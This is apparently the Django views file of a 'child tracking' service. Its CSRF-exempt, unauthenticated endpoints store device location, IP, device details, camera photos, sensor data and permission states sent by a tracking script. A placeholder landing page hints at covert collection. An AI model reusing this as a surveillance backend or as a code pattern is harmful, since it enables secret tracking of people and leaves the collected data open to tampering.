import json
from django.http import JsonResponse, HttpResponseBadRequest
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import get_object_or_404, render
from .models import (Child, LocationLog, IPLog, DeviceInfoLog, PhotoCapture,
                     SensorDataLog, PermissionLog)

# Landing page view
def landing(request):
    return render(request, 'tracking/placeholder.html')

@csrf_exempt
def update_location(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            LocationLog.objects.create(
                child=child,
                latitude=data.get('latitude'),
                longitude=data.get('longitude'),
                accuracy=data.get('accuracy')
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@csrf_exempt
def update_ip(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            IPLog.objects.create(
                child=child,
                ip_address=data.get('ip_address'),
                details=data.get('details', '')
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@csrf_exempt
def update_device_info(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            DeviceInfoLog.objects.create(
                child=child,
                user_agent=data.get('user_agent', ''),
                platform=data.get('platform', ''),
                screen_width=data.get('screen_width', 0),
                screen_height=data.get('screen_height', 0),
                other_details=data.get('other_details', {})
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@csrf_exempt
def capture_photo(request):
    if request.method == 'POST':
        try:
            device_id = request.POST.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            image = request.FILES.get('image')
            latitude = request.POST.get('latitude')
            longitude = request.POST.get('longitude')
            PhotoCapture.objects.create(
                child=child,
                image=image,
                latitude=latitude if latitude else None,
                longitude=longitude if longitude else None
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@csrf_exempt
def update_sensor_data(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            sensor_data = data.get('sensor_data', {})
            child = get_object_or_404(Child, device_id=device_id)
            SensorDataLog.objects.create(
                child=child,
                data=sensor_data
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@csrf_exempt
def update_permission_status(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            PermissionLog.objects.create(
                child=child,
                geolocation=data.get('geolocation', False),
                camera=data.get('camera', False),
                microphone=data.get('microphone', False),
                notifications=data.get('notifications', False),
                clipboard=data.get('clipboard', False),
                sensors=data.get('sensors', False),
                bluetooth=data.get('bluetooth', False),
                other=data.get('other', {})
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@csrf_exempt
def js_version(request):
    # This endpoint returns the current version of tracking.js.
    # In a production system, you might manage versioning via deployment.
    return JsonResponse({'version': '1.0.0'})
